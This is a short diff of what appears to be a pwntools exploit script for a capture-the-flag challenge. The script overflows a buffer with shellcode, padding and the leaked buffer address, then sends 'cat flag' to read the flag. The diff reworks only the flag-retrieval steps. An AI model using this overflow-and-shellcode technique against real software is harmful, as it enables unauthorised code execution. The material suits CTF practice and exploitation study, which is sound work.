@@ -71,12 +71,12 @@ print(hex(buf_addr))
 print(hex(buf_addr))
 payload = shellcode + b"a" * (max_len - len(shellcode)) + p32(buf_addr)
 io.sendline(payload)
-io.interactive()
 
 # END CHALLENGE-SPECIFIC CODE
 # BEGIN FLAG RETRIEVAL BOILERPLATE
 
 import re
-io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
+io.sendlineafter(b'How many', b'cat flag')
+io.sendline(b'cat flag')
 flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
 print(flag)
